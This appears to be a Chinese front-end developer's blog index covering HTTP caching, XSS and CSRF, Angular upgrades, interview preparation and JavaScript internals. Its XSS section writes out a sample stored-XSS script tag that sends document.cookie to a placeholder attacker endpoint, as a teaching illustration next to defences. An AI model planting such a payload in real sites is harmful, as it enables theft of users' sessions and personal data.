强缓存命中强缓存时，状态码为 200（Size 列标识为 from cache）的响应请求，利用 Expires 和 Cache-Control 控制强缓存。 Expires该值是响应头的字段，指定缓存到期的时间， Expires=时间，该时间为绝对时间，Last-Modify 结合使用 Cache-Control该值是响应头的字段，指定缓存到期的时间，Cache-Control=max-age+时间，该事件为相对时间 Cache-Control 优先级比 Expires 高优点：服务器配置有限，降低服务器压力，1 台服务器能做到 10 台服务器的能力 &lt;- Expires: xxxx&lt;- Cache-Control:max-age=600 协商缓存命中协商缓存时，状态码为 304，利用 Last-Modify/If-Modify-Since Last-Modify/If-Modify-Since第一次请求服务器，返回时会带上 Last-Modify 的响应头，标识着该资源最后修改时间，第二次请求时会带上 If-Modify-since 请求头，值为第一次响应的 Last-Modify 值，服务器会根据 If-Modify-since 判断是否命中缓存，如果命中则不请求服务器，返回 304，不返回 Last-Modify第一次响应： Last-Modify第二次请求： If-Modify-since Etag/If-None-MatchEtag/If-None-Match 返回的是一个校验码，Etag 保证每个资源时唯一的，资源的变化都为导致 Etag 改变，服务器根据浏览器发送的 If-None-Match 判断是否命中缓存两者会优先验证 Etag,两种区别： 精度问题，第一种的精度时精确到秒，当资源的改变在秒级的时候，不太准确。所以由了 Etag 文件定期生成，当内容一样时，无法使用 Last-Modify 这一套 有可能存在服务器没有准确获取文件修改时间等，Last-Modify 也不能使用 &lt;- last-modifed: xxx-&gt; if-modified-since: xxx&lt;- etag: bbb-&gt; if-noe-match: bbb web 安全浏览器如何获取到 Cookie 利用接口响应的 Set-Cookie 字段有哪些属性 domain max-age、Express httponly name=value XSS (Cross-Site-Script) 跨站脚本攻击恶意攻击者，将一些恶意代码插入到网页，当用户访问的时候自动执行这段代码，从而达到攻击者目的 反射型特点： 一次性用户点开带有恶意的 url（含有 script），浏览器将此段发送给服务端，服务端返回客户端，此时浏览器识别到可执行代码将其执行 存储型特点：恶意代码存储到服务器攻击者提交含有 script 标签的恶意代码表单到服务器，服务端将其保存，展示给其他用户时执行恶意代码 实现过程 将 &lt;script scr=&quot;https://攻击者接口?cookie=document.cookie&quot;&gt; &lt;/script&gt;， 注册成用户名， 提交给服务端，服务端保存 用户登录，如果查看到这个攻击者的账号信息相关，那么会执行恶意代码，将 cookie 拿到，发送到攻击者接口 攻击者事先会收集各种接口，找到相关可以获取到用户的接口 通过 cookie 获取到用户信息（手机号等）等 用途 冒充身份 刷点击（注入文章地址） 弹广告（注入一段创建弹窗的代码） 蠕虫病毒（冒充身份去发送邮件，联系人点开又会冒充去发送邮件….） 怎么防御 输入过滤，对于特殊符号等不允许提交 httponly 转义 HTML 比如： &lt; =&gt; &amp;lt 、 &gt; =&gt; &amp;gt CSRF (Cross-Site-Request-Forgery) 跨站点请求伪造诱导受害者去到攻击者的网站，攻击者网站发起了相关请求，并且带上了受害者 cookie，从而可以做一些恶意的操作 前提： 浏览器没有严格执行同源政策，请求所在网站必须和请求的接口同源，就有可能发生 CSRF 实现过程 受害者登录信任网站 未关闭含有 cookie 的信任网站 诱导受害者去攻击者网站（如果配合 XSS 此时可能会直接跳转，或者弹窗诱导到攻击者网站） 在攻击者网站（用隐藏表单自动发送请求，img/src 自动 get 请求等骚操作…）发起信任网站相关接口，此时会携带用户的 cookie，冒充用户 用途 冒充身份 蠕虫病毒（冒充身份去发送邮件，联系人点开又会冒充去发送邮件….） 怎么防御 用验证码，信任网站开启验证码，而攻击者网站没办法获取正确验证码 Referer ，表明请求的站点地址，但是有可能存在伪造 Referer 头 token，客户端接收服务端的 token，保存在隐藏区域（本地存储，隐藏的 html 元素，代码内存等），请求带上 token 使用带有同源政策的浏览器，升级到默认开启严格模式版本 中间人攻击是在数据传输时发生的攻击手段。截取 http 在传输时数据包，获取用户信息，篡改信息，篡改密钥","link":"/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/%E7%BD%91%E7%BB%9C/"},{"title":"angular升级","text":"6 升 7项目使用 angular@6+ng-zorro-antd@1.5背景：项目中列表数据量大，滚动，操作等卡顿此前已经根据该问题利用数据触底加载的方案进行简单优化，但是当全部数据加载完毕时，页面还存在卡顿现象原因： All watchers are run every time anything happens. Click handlers, HTTP response processors, and timeouts all trigger a digest每次发生任何事情时，所有的观察者都会运行。点击处理程序、HTTP 响应处理器和 settimeout 等都会触发脏值检测 angular 的检测机制有关，点击页面都会影响 angular 去检测组件，当页面有大量 dom 时检测成本也相应变高，导致页面卡顿 利用 angular 框架自带的虚拟滚动（需要将 cdk 升级到 7，cdk 的升级是与其他 angular 模块分开升级的，可查看 cdk 的更新日志）去优化，减少 dom 节点，减少检测 采用 CheckOnce 策略 https://angular.cn/api/core/ChangeDetectionStrategy过程： 1231. ng update @angular/cli@7 ng update @angular/core@72. ng update @angular/cdk@73. ng update ng-zorro-antd@7 升级后样式会有差异： nztree 树状组件箭头图标显示 nztable 表格内 font-family 字体 很多组件采用 onpush 策略，数据需要改变引用指针才会触发页面更新 参考文档： angular： https://github.com/angular/angular/blob/master/CHANGELOG.md#700-2018-10-18 cdk: https://github.com/angular/components/blob/master/CHANGELOG.md#700-amethyst-ammonite-2018-10-17 ng-zorro-antd: https://ng.ant.design/version/7.5.x/docs/changelog/zh#7-0-0 更新指南: https://update.angular.io/?l=2&amp;v=9.1-10.0 8 升 9 9 升 10升级一个项目框架，要从几个方面考量 升级的必要性 升级的版本兼容性 升级之后带来了什么好处 大小（包括升级期间，调整的兼容性代码） 升级前：1.22+2.1=3.12 升级后：91.7+1.21=2.91 升级后：101.45+1.31=2.76 过程 12341.ng update @angular/cli@8 ng update @angular/core@82.ng update @angular/cli@9 ng update @angular/core@93.ng update @angular/cdk@94.ng update ng-zorro-antd@9 1231.ng update @angular/cli@10 ng update @angular/core@102.ng update @angular/cdk@103.ng update ng-zorro-antd@10 安装相应的版本，会自动检查代码，自动补丁相应版本指令，参数等…，检测不到的根据编辑器提示自行手动调整从旧版本升级 ng-zorro-antd 需要注意，某些样式会有微调。会稍微影响布局。可自行调整，影响不大 9 升级 10 时需要注意 使用二级入口ng-zorro-antd v8 中弃用了 NgZorroAntdModule 和一级入口，并保留了 2 个版本后在此版本中移除 10 版本有关 CommonJS 导入的警告当您使用 CommonJS 打包的依赖项时，它会导致应用程序变慢。从版本 10 开始，当您的构建引入这些捆绑软件之一时，我们现在向您发出警告。如果您开始对依赖项看到这些警告，请让您的依赖项知道您更喜欢 ECMAScript 模块（ESM）捆绑包。angular.json 添加配置允许 commonjs 引入不警告 123&quot;allowedCommonJsDependencies&quot;: [ &quot;@angularclass/hmr&quot;], 更新指南： https://update.angular.io/?l=2&amp;v=9.1-10.0","link":"/2021/09/22/%E7%AC%94%E8%AE%B0/angular%E5%8D%87%E7%BA%A7/"},{"title":"深信服","text":"一面自我介绍 表明从哪里来，被谁推荐来，荣幸，高兴来 简单介绍目前工作情况，架构变动导致迅速成长，主要职责（…） 简单介绍主要成就（跨技术栈组件，接口代码生成工具，商品列表实现配置快速接入页面，vue 脚手架）引导面试官追问 综合招聘资料，符合岗位要求 正式开始 围绕项目一一展开 背景 作用是什么 如何使用 面向过程还是对象（说面向对象，引导出设计模式） 如何维护，运行报错怎么排查 如何发包 在项目中的难点是什么，怎么解决 可以去扩展吗（结合自己是面向对象的写法，可以说基于基类去多写一个类） 看过什么设计模式，以及有在项目中使用吗 做过 webpack 什么优化 webapck 和 rollup 有什么区别 web 安全你知道有哪几种，怎么防御，对于 crsf，有案例用户被拿到了电话号码，这个过程怎么实现？ vue 父子组件钩子运行时的顺序 vue 的生命周期介绍 vue 子组件在更新到渲染的执行过程是怎么样的 vnode 是什么 子组件 render 触发的时候父组件会不会触发 render 父组件 render 触发会不会触发子组件 render vue 的插件机制 angular 和 vue 你认为有什么区别，你自己喜欢哪种，理由是什么 如果有个 npm 包内有逻辑错误，结合项目生命周期短应该怎么去修复 怎么发布一个 npm 认为自己比较擅长哪方面（业务，基础架构，技术框架，插件） ts type 和 interface 区别 ts 怎么重写一个类型里面的属性类型，用 type ，interface 两者各自实现（对于 interface 要使用 pick 高级用法） 描述一下副作用，副作用的作用 纯函数是什么 wepack 和 rollup 如何设置副作用对其 tree shaking github 上面有项目吗（有个基于 webcomponent 的正在建设组件库）介绍一下（我说出了背景，有包括了哪几种技术选型，规划，以及目前进度） 对于现在岗位有什么计划吗（引导计划微前端，简单说原理） 中间有一道算法题，将一个含有父 id 被拍平的树，重新生成一颗树 12345678910111213141516171819202122arr = [ { id: 1, name: &quot;a&quot;, parentId: -1, }, { id: 2, name: &quot;b&quot;, parentId: 1, }, { id: 3, name: &quot;c&quot;, parentId: 2, }, { id: 4, name: &quot;d&quot;, parentId: 3, },]; 总结：基本能答上，但是百分之 25 左右吱吱呜呜答不出所以然，还有一道算答题没做出来。对于发散性的问题应该主要考察工作时的一些工作能力，回答的时候应该尽可能主动去列出多种情况以及补救方法（比如现在报错了怎么定位，npm 报错了，你认为 xxx 等） 二面主要针对自己做的项目介绍-&gt; [项目面]","link":"/2022/06/25/%E9%9D%A2%E8%AF%95/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"},{"title":"项目面","text":"基于项目面试的一些心得 先讲它是什么（讲完即止，让面试官掌握节奏，避免面试时间过长） 背景 什么作用 技术栈 为什么选择这些技术栈 怎么做 如何维护，扩展 讲的时候一定要清晰，有条理，能让人知道用这个东西的原因，效果。 接口代码生成工具 是个什么东西：是一个用利用 swagger 文档数据生成的，给前端调用的接口代码， 为什么做这个东西，那就说一下背景… 接口太多，项目中接口的管理太混乱，那为了开发时不关注这些接口的文件位置、怎么取函数名、维护类型。通过一个插件一键生成在项目中规定的位置，规范文件结构，自动生成类型，函数名，注释等等，解决了接口管理问题与接口代码解耦，可以提高开发效率 怎么做的，讲难点… 文件结构，由 swagger 的 tags 也就是后端一个 control 作为一份 service 文件，文件名为这个 control 的名字，里面包括了这个 control 的接口 函数名的生成，由 swagger 中 paths 生成，接口地址转换驼峰 类型声明生成，根据 swagger 入参，responese 中的 type 或者 schame 的描述，复杂类型利用 schame 的标识生成一个文件，用 import 引入 怎么使用… 在项目根目录提供一个配置 js 文件，里面包含了可以配置 swagger 地址，以及要生成的接口范围，排除范围，生成的文件放在哪等配置 使用 package.json、script 命令启动 可以如何扩展… 可以扩展其他的接口文档，比如 yapi 可以扩展到编写 vscode 的插件 可以加一些功能比如、根据项目 eslint 修复代码风格 vue 的业务脚手架 是个什么东西： 是一个基于 vue-cli preset 工具实现的远程代码模板，这个模板包括了根据部门情况定制的一套规范代码结构，文件结构 为什么要做？… 第一，因为之前可能团队更多的项目是 angular 开发的，为了保持一个文件和代码结构的一致性，去模仿他的结构，让团队顺滑切换 vue 和 angular 第二，快速响应需求，因为我们负责的一个系统是，一种 iframe 嵌套的微前端，不同的功能模块那就有可能需要频繁的创建一个新的项目 第三，可以关注社区情况，及时去更新维护自己的一个框架结构，后面就可以使用比较新的技术点了 怎么使用，那就简单描述生成的流程… 首先是执行命令 vue create –preset 远程地址 那我们的模板仓库有包含四样东西, template,generator.js,prompts.js,preset,json 命令执行之后会先执行 prompt.js 让用户选择环境 再执行generator.js, 暴漏render接口 将render传入tempalte 基于 stencil 下拉组件 是个什么东西： 是一个包含用户所拥有权限的平台列表点击可跳转的自定义下拉选择框，类似 dropDown 什么是平台呢？那就说一下背景…. 是这样的背景： 像我们电商的有商品管理列表，运营了很多个平台（亚马逊，shopee 等）的商品列表，用户呢，想要在里面的列表去实现不同平台列表之间跳转 怎么做呢？ 那就说一下项目从里到外，挑难点讲，说一遍…. 首先要有两个接口，一个所有平台的页面地址，另一个是用户拥有的权限平台，这样可以使下拉框展示的是用户所有用权限的平台。 第二是要实现下拉展开，和上拉收起的动画，使用了鼠标移入移除事件，利用 setInterval 监听 第三是要处理边界情况，比如用户未登录提示，用户没权限提示，下拉框的最大高度不能超过浏览器可视区 第四是打包发布，要分为两种发布，一种是 npm 包形式，一种网络资源的访问方式（给前后端不分离的项目用） 怎么使用？ 自动注册了webcomponent，像我们正常使用的组件一样 选择的技术 查了资料：有一个 ionic-team 正在做 webcomponent 的工程，他有一个 stencil 的框架，他是基于 webcomponent 的框架，提供了一套很好的方案 为什么选这个呢？ 一，体积小二，运行时性能高三，标准，面向未来四，与 angular 写法相似，团队较容易容纳五，引入新的技术，提高团队学习热情六，可以接纳不同的技术栈 相对于 vue，angular 所提供的 webcomponent，他们是需要本身框架的支持，也就是说想要用那就得引入他们的框架，也就会造成一个组件体积比较大的问题，通过相同组件去打包对比大小。 性能用 performance 工具 查看 script 和 render 执行时间 采用了 jsx、typescript、Virtual Dom，弥补 webcomponent 不能传对象问题 基于 ng-ant-desgin 组件库 主要的职责？ 将部门不同版本的组件收集，并将发布 使用 json，ast 配置快速生成页面keepeact 框架 是什么？是一个小型 mvvm 框架，使用 jsx 开发，为开发者提供一套声明式框架，最终将组件挂载到jq的扩展方法上。使用框架时需要依赖jq。 背景是什么背景会去产生这个框架的？为什么vue，angular等不行？jq等旧页面需要前端提供组件，或者需要和新页面统一组件，比如：多选框，平台选择框vue和angular都行，都有自定义元素的功能，但是打包出来的体积vue大概有app+vendors大概有100kb，并且定位是组件库，有大材小用嫌疑。 优点 声明式 jsx，tsx面向未来 有diff算法支持，性能有保障 缺点 需要手动update，无自动依赖收集 难点 如何利用jq扩展 如何定制生命周期beforeMount|mount|mounted|writeValue|valueChange patch原理 如何通讯","link":"/2022/06/25/%E9%9D%A2%E8%AF%95/%E9%A1%B9%E7%9B%AE%E9%9D%A2/"},{"title":"javascript","text":"内存机制js 内存空间分为栈(stack)、堆(heap) 栈：数据在栈内存中的存储与使用方式类似于数据结构中的堆栈数据结构，遵循后进先出的原则。 堆： 12345var a1 = 0; // ``栈`var a2 = &quot;this is string&quot;; // ``栈`var a3 = null; // ``栈`var b = { m: 20 }; // ``变量``b``存在于栈中，``{m: 20} ``作为对象存在于堆内存中`var c = [1, 2, 3]; // ``变量``c``存在于栈中，``[1, 2, 3] ``作为对象存在于堆内存中``` 基础数据类型： Number String Null Undefined Boolean 内存泄漏： 当内存存在无法被垃圾回收时，这种就叫内存泄漏一段代码解释： 1234567891011121314151617// dom处理const el = document.gteElementById(&quot;id&quot;);el.onclick = () =&gt; { console.log(el); // 产生循环引用};// 闭包const counter = () =&gt; { let num = 0; return () =&gt; { num++; };};const count = counter();count(); // num === 1count(); // num === 2// num并不会被回收 如何解决： 手动清除引用 12345let el = document.gteElementById(&quot;id&quot;);el.onclick = () =&gt; { console.log(el); el = null; // 执行完释放}; 使用弱引用-不计入 gc weakMap weakSet 调用栈什么是调用栈？调用栈指的是管理函数调用的一种数据结构，栈一种容器，遵循先进后出，后进先出。什么是栈溢出？一段代码解释： 1234function division(x, y) { return division(x, y);}division(1, 2); 函数递归调用，会出现压栈的行为，并不会弹出直到递归停止，当到达一定程度的数量，栈容器就会存在不够存放的情况，这种就叫栈溢出。如何解决栈溢出？ 利用异步任务优化（宏任务/微任务） 尾调用优化 内存的生命周期JS 环境中分配的内存一般有如下生命周期： _内存分配_：当我们申明变量、函数、对象的时候，系统会自动为他 们分配内存 _内存使用_：即读写内存，也就是使用变量、函数等 _内存回收_：使用完毕，由垃圾回收机制自动回收不再使用的内存 为了便于理解，我们使用一个简单的例子来解释这个周期。 var a = 20; // 在内存中给数值变量分配空间 alert(a + 100); // 使用内存 var a = null; // 使用完毕之后，释放内存空间 内存回收在局部作用域中，当函数执行完毕，局部变量也就没有存在的必要了，因此垃圾收集器很容易做出判断并回收。但是全局变量什么时候需要自动释放内存空间则很难判断，因此在我们的开发中，需要尽量避免使用全局变量，以确保性能问题。 1234567891011121314151617181920212223function fun1() { var obj = {name: 'csa', age: 24};}function fun2() { var obj = {name: 'coder', age: 2} return obj;}var f1 = fun1();var f2 = fun2(); 在上述代码中，当执行var f1 = fun1();的时候，执行环境会创建一个{name:'csa', age:24}这个对象， 当执行var f2 = fun2();的时候，执行环境会创建一个{name:'coder', age=2}这个对象 然后在下一次垃圾回收来临的时候，会释放{name:'csa', age:24}这个对象的内存，但并不会释放{name:'coder', age:2}这个对象的内存。 这就是因为在fun2()函数中将{name:'coder, age:2'}这个对象返回，并且将其引用赋值给了 f2变量，又由于f2这个对象属于全局变量，所以在页面没有卸载的情况下，f2所指向的对象{name:'coder', age:2}是不会被回收的。 标记清除算法标记清除算法将“不再使用的对象”定义为“无法达到的对象”。简单来说，就是从根部（在 JS 中就是全局对象）出发定时扫描内存中的对象。凡是能从根部到达的对象，都是还需要使用的。那些无法由根部出发触及到的对象被标记为不再使用，稍后进行回收。 线程 VS 进程线程：多线程可以并行处理，但是线程是不能单独存在的，它是由进程来启动和管理的。进程：一个进程就是一个程序的运行实例。详细的解释：启动一个程序的时候，操作系统回味该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的主线程 从图中可以看出线程依附于进程的，而进程中使用多线程并行处理能提升运算效率 进程和线程关系 进程中的任意一线程执行出错，都会导致整个进程的崩溃 线程之间共享进程中的数据 当一个进程关闭之后，操作系统会回收进程所占用的内存 进程之间的内容相互隔离，进行通讯需要使用用于进程通信（IPC）的机制了 Promise解决了什么问题promise解决的是异步编码风格的问题 异步编程的问题： 代码逻辑不连续 状态和方法 有几种状态 pending fulfilled rejected 状态是否可变状态不可变，resolve 之后不可 rejected，反之也是 有哪些方法，应用场景 then race all catch reject allsettled any async/await catch 的捕获机制 12345678910111213141516171819202122function executor(resolve, reject) { let rand = Math.random(); console.log(1) console.log(rand) if (rand &gt; 0.5) resolve() else reject()}var p0 = new Promise(executor);var p1 = p0.then((value) =&gt; { console.log(&quot;succeed-1&quot;) return new Promise(executor)})var p3 = p1.then((value) =&gt; { console.log(&quot;succeed-2&quot;) return new Promise(executor)})var p4 = p3.then((value) =&gt; { console.log(&quot;succeed-3&quot;) return new Promise(executor)})p4.catch((error) =&gt; { console.log(&quot;error&quot;)})console.log(2) 当第一个出错时。p4 仍可以捕获到错误。这样就解决了每个任务都需要单独处理异常的问题 ​ https://juejin.cn/post/6945319439772434469 ​ 思考 Promise 中为什么要引入微任务？ Promise 中是如何实现回调函数返回值穿透的？ Promise 出错后，是怎么通过“冒泡”传递给最后那个捕获异常的函数？ promise 部分实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159class AlleyPromise { // 1、Promise三种状态 static PENDING = &quot;PENDING&quot;; static FULFILED = &quot;FULFILED&quot;; static REJECTED = &quot;REJECTED&quot;; constructor(callback) { // 容错处理 if (typeof callback !== &quot;function&quot;) { throw new TypeError(&quot;Promise resolver undefined is not a function&quot;); } // 初始状态 this.promiseStatus = AlleyPromise.PENDING; // 定义resolve函数队列 reject函数队列 this.resolveQueues = []; this.rejectQueues = []; //定义初始值 this.value; //调用callback函数 callback(this._resolve.bind(this), this._reject.bind(this)); } _resolve(val) { queueMicrotask(() =&gt; { // 更改成功状态 if (this.promiseStatus !== AlleyPromise.PENDING) return; this.promiseStatus = AlleyPromise.FULFILED; this.value = val; let handler; while ((handler = this.resolveQueues.shift())) { handler(this.value); } }); } _reject(val) { queueMicrotask(() =&gt; { // 更改失败状态 if (this.promiseStatus !== AlleyPromise.PENDING) return; this.promiseStatus = AlleyPromise.REJECTED; this.value = val; let handler; while ((handler = this.rejectQueues.shift())) { handler(this.value); } }); } then(resolveHandler, rejectHandler) { return new AlleyPromise((resolve, reject) =&gt; { function newResolveHandler(val) { // 首先判断 resolveHandler是否是一个函数 if (typeof resolveHandler === &quot;function&quot;) { /* 获取resolveHandler 函数的返回值进行判断 如果是promise则继续.then，不是则直接将结果返回 */ let result = resolveHandler(val); if (result instanceof AlleyPromise) { result.then(resolve, reject); } else { resolve(result); } } else { resolve(val); } } function newRejectHandler(val) { if (typeof rejectHandler === &quot;function&quot;) { let result = rejectHandler(val); if (result instanceof AlleyPromise) { result.then(resolve, reject); } else { reject(result); } } else { reject(val); } } this.resolveQueues.push(newResolveHandler); this.rejectQueues.push(newRejectHandler); }); } catch(rejectHandler) { return this.then(undefined, rejectHandler); } static all(iterator) { let len = iterator.length; let n = 0; let vals = []; return new AlleyPromise((resolve, reject) =&gt; { iterator.forEach((item) =&gt; { item .then((val) =&gt; { ++n; vals.push(val); if (len === n) { resolve(vals); } }) .catch((e) =&gt; { reject(e); }); }); }); } static race(iterator) { return new AlleyPromise((resolve, reject) =&gt; { iterator.forEach((item) =&gt; { item .then((val) =&gt; { resolve(val); }) .catch((e) =&gt; { reject(e); }); }); }); } static resolve(val) { return new AlleyPromise((resolve) =&gt; { resolve(val); }); } static reject(val) { return new AlleyPromise((resolve, reject) =&gt; { reject(val); }); }}const promise1 = new AlleyPromise((resolve, reject) =&gt; { // reject(1213); setTimeout(() =&gt; { resolve(); }, 2001);});// promise1// .then((res) =&gt; {// return MyPromise.resolve(&quot;valu23e&quot;);// })// .then((res) =&gt; {// console.log(res);// });promise1 .then((res) =&gt; 123) .then((res) =&gt; new AlleyPromise((res) =&gt; res(12))) .then((res) =&gt; { console.log(23, res); }) .catch((res) =&gt; { console.log(23, res); });a; 宏任务和微任务 宏任务 渲染事件（解析 DOM、计算布局、绘制） 用户交互事件（鼠标点击、滚动页面） js 脚本执行事件 网络请求完成事件 为了协调这些任务在主线程上稳定执行，引入了消息队列和事件循环机制，消息队列中的任务，就称为宏任务，消息队列中的任务是通过事件循环系统执行的 微任务 MutationObserver监控某 DOM 节点，通过 js 操作节点，节点发生变化，产生记录 DOM 变化的微任务 使用Promise，调用Promise.resolve()或者Promise.reject()产生微任务 执行脚本时，在宏任务执行过程中有时候会产生很多微任务，引擎会创建一个微任务队列，来存放微任务微任务执行时机：当前宏任务执行完成时，清空栈时，引擎检查微任务队列，按顺序执行队列中的任务如果微任务队列执行中产生新的微任务，同样的会加到同个微任务队列中，循环执行。并不会推迟到下个宏任务中执行 结论： 微任务和宏任务时绑定的，每个宏任务在执行时会创建自己的微任务队列。 微任务时长会影响到当前宏任务的时长 在一个宏任务中，分别创建一个用于回调的宏任务和微任务，无论什么情况，微任务都早于宏任务。 1234567891011121314151617function fn(cb) { console.log(&quot;谁先执行呢&quot;); setTimeout(() =&gt; { console.log(&quot;setTimeout执行&quot;); cb(); }); new Promise((resolve) =&gt; { resolve(); }).then(() =&gt; { console.log(&quot;Promise执行&quot;); cb(); });}fn(() =&gt; {});// 谁先执行呢// Promise执行// setTimeout执行 12345678910111213141516171819202122232425262728function executor(resolve, reject) { let rand = Math.random(); console.log(1); console.log(rand); if (rand &gt; 0.5) resolve(); else reject();}var p0 = new Promise(executor);var p1 = p0.then((value) =&gt; { console.log(&quot;succeed-1&quot;); return new Promise(executor);});var p3 = p1.then((value) =&gt; { console.log(&quot;succeed-2&quot;); return new Promise(executor);});var p4 = p3.then((value) =&gt; { console.log(&quot;succeed-3&quot;); return new Promise(executor);});p4.catch((error) =&gt; { console.log(&quot;error&quot;);});console.log(2); 作用域作用域，可以说是一套储存变量，访问变量的一套规则。指的是在这规则约束下，变量，函数，标识符可访问的区域。js 作用域是词法作用域，一种静态作用域，静态作用域是代码编译阶段就决定好了，跟函数调用没有关系有三种作用域：全局作用域函数作用域块级作用域 作用域链当作用域套作用域时，就形成了一条作用域链。全局套函数函数套函数比如 1234var b = 1;function a() { console.log(b);} 作用： 可让 a 函数可以访问到外部作用的变量，查找变量时的这条链就称为作用域链 但注意，作用域链时基于词法作用域的，也就是说作用域链的形成是代码书写阶段就已经确认下来 闭包本质： 根据词法作用域，内部函数总是可以访问外部函数中声明的变量，当通过调用外部函数返回的内部函数时，外部执行完，但是内部函数引用外部函数的变量依然保存在内存，把这个些变量的结合称之为闭包。外部函数的闭包 执行上下文执行上下文，是代码的执行环境。执行上下文可分为以下： 全局执行上下文： window 对象 this 其他变量对象 函数执行上下文 arguments this（不固定，根据谁引用就指向谁） 其他活动对象 eval 执行上下文 分仔细还可以将执行上下文分为： 变量环境 （var 等定义的变量） 词法环境（let、const 等定义的变量） 作用域链（scope） this 执行上下文的生命周期：创建阶段： 生成变量对象，安排内存 确认 this 确认作用域执行阶段： 变量赋值 变量提升，也就是在全局上下文创建阶段，给变量初始化安排内存，这时并未赋值 调用栈先说结论，调用栈呢，是一种数据栈的数据结构管理执行上下文的，当执行环境执行多个函数时，也就是执行上下文执行调用函数时，会按顺序压入栈，执行到谁就先压入，遵循先进后出，执行完立即弹出。从调用栈理解作用域：我们所说，外部函数往往是访问不到内部函数的，这是为什么呢？ 12345678function a() { console.log(bb); function b() { var bb = &quot;a拿不到我&quot;; } b();}a(); 调用栈的执行情况： 此时b位于栈顶，执行完直接弹出栈，b执行上下文被销毁，a自然是拿不到bb这个处于b作用域的变量 执行环境中的变量对象和活动对象概念：每一个执行环境中都有一个与之关联的变量对象。如果这个环境是函数，那么将活动对象作为变量对象,活动对象最开始只包含一个变量，arguments对象。作用域链中的下一个比那辆对象来自外部环境扩展：当执行流进入一个函数，函数的环境推入一个环境栈中，执行之后，再将环境弹出。代码在一个环境中执行时，会创建变量对象的作用域链。作用域用途，是保证对执行环境有权访问的所有变量和函数的有序访问 this 那些事this对象是在运行时基于函数的执行环境绑定的 默认绑定规则：this指向window 隐式绑定规则：函数被当作对象的方法调用时，this指向对象（谁调用就指向谁） 显示绑定规则：call、apply、bind改变this指向 bind、apply、call 实现1234567891011121314151617181920212223242526272829303132333435363738let obj = { a: 123,};function fn(p) { console.log(this.a, p);}// callfn.call(obj, &quot;wuxunyu&quot;); // 123,wuxunyu// bindconst fn1 = fn.bind(obj);fn1(&quot;wuxunyu&quot;); // 123, wuxunyu// applyfn.apply(obj, [&quot;wuxunyu&quot;]); // 123, wuxunyuFunction.prototype.myCall = function (context, ...arg) { context.fn = this; context.fn(...arg); delete context.fn;};Function.prototype.myBind = function (context, ...arg) { context.fn = this; return function () { context.fn(...arg); delete context.fn; };};Function.prototype.myApply = function (context, arg) { if (!Array.isArray(arg)) { return; } context.fn = this; context.fn(...arg); delete context.fn;}; 原型对象和原型链 原型对象 概念：每一个构造函数中都有一个对象，prototype，称为原型对象。 构造函数、原型和实例的关系：原型对象prototype都包含一个指向构造函数constructor的指针，而实例都包含一个指向原型对象的内部指针__proto__ 12345function SuperType() { this.property = true;}const superType = new SuperType();console.log(superType.__proto__ === SuperType.prototype); // true 原型链假设，让A的原型对象prototype等于另一个类型B的实例，此时A原型对象prototype将包含一个指向B原型的指针__proto__,相应的，B原型中也包含着一个指向另一个构造函数的指针。假如，又让C的原型对象prototype等于A的实例,如此层层递进，就构成了实例与原型的链条，这就是原型链的基本概念 12345678910111213141516function SuperType() { this.property = true;}SuperType.prototype.getSuperValue = function () { return this.property;};function SubType() { this.subproperty = false;}// 继承了 SuperTypeSubType.prototype = new SuperType();SubType.prototype.getSubValue = function () { return this.subproperty;};var instance = new SubType();console.log(instance.getSuperValue()); // true 原型链的基本思想是利用原型让一个引用类型继承另一个引用类型的属性和方法 继承原型链继承12345678910111213141516function Child() { this.name = &quot;child&quot;;}function Parent() { this.eat = [1, 2, 3];}Child.prototype = new Parent();const child1 = new Child();const child2 = new Child();child1.eat.push(4);child1.eat; // [1,2,3,4]child2.eat; // [1,2,3,4] 缺点: 子共用同个属性方法，同个引用类型 借用构造函数继承1234567891011121314151617181920function Child() { Parent.call(this); // 将parent的this指向child，将parent方法转移到child this.name = &quot;child&quot;;}function Parent() { this.eat = [1, 2, 3];}Parent.prototype.getName = function() { console.log(this.name);}const child1 = new Child();const child2 = new Child();child1.eat.push(4);child1.eat; // [1,2,3,4]child2.eat; // [1,2,3]child1.getName() // 报错 解决了原型链继承方法缺点缺点: 子获取不到父原型上的属性方法 组合继承1234567891011121314151617181920212223function Child() { Parent.call(this); // 将parent的this指向child，将parent方法转移到child this.name = &quot;child&quot;;}function Parent() { this.eat = [1, 2, 3];}Parent.prototype.getName = function() { console.log(this.name);}Child.prototype = new Parent();Child.prototype.constructor = Child;const child1 = new Child();const child2 = new Child();child1.eat.push(4);child1.eat; // [1,2,3,4]child2.eat; // [1,2,3]child1.getName() // child 解决了借用构造函数获取不到父类原型上的属性方法缺点: 调用了两次父类 原型式继承1234567891011121314const child = { name: 'child', eat: [1,2,3], getName: function(){ console.log(this.name); }}const child1 = Object.create(child);const child2 = Object.create(child);child1.eat.push(4);child1.eat; // [1,2,3,4]child2.eat; // [1,2,3,4] 缺点: 虽然简洁，但是同样存在引用同个引用问题 寄生式继承与原型式差不多，只不过多了可以扩展父类的方法 寄生组合式继承12345678910.... // 与组合继承一样，只不过prototype的赋值有些不同Child.prototype = Object.create(Parent.prototype);Child.prototype.constructor = Child;const child1 = new Child();const child2 = new Child();child1.eat.push(4);child1.eat; // [1,2,3,4]child2.eat; // [1,2,3] 最优继承方式 new 实现 创建空对象 obj = {} this指向新对象，并执行构造函数，并获取返回结果 设置原型链，新对象原型对象指向构造函数prototype 判断构造函数返回结果是否为对象，是则返回，否则返回由new创建的对象a 12345678910111213function myNew() { const obj = {}; const constructor = [].shift.call(arguments); const result = constructor.apply(obj, arguments); // 改变构造函数中的this obj.__proto__ = constructor.prototype; // obj的原型对象指向构造函数prototype return typeof result === &quot;object&quot; ? result : obj;}myNew(function () { this.a = 2323;}); // {a: 2323}new (function () { this.a = 2323;})(); // {a: 2323} instanceOf 实现123456789101112131415function A() {}const a = new A();a instanceof A; // truea instanceof Object; // truefunction myInstanceof(a, b) { let p = a.__proto__; while (p) { if (p === b.prototype) { return true; } p = p.__proto__; } return false;} 性能优化如何让网络通信更快CDNCDN 全称 content delivery network，又称内容分发网络，CDN 有两个指标，全局负载均衡和缓存系统 全局负载均衡用户在访问服务器的时候，首先要向 DNS 服务器发起请求，经过解析后返回到这个网站域名的注册服务器去解析，DNS 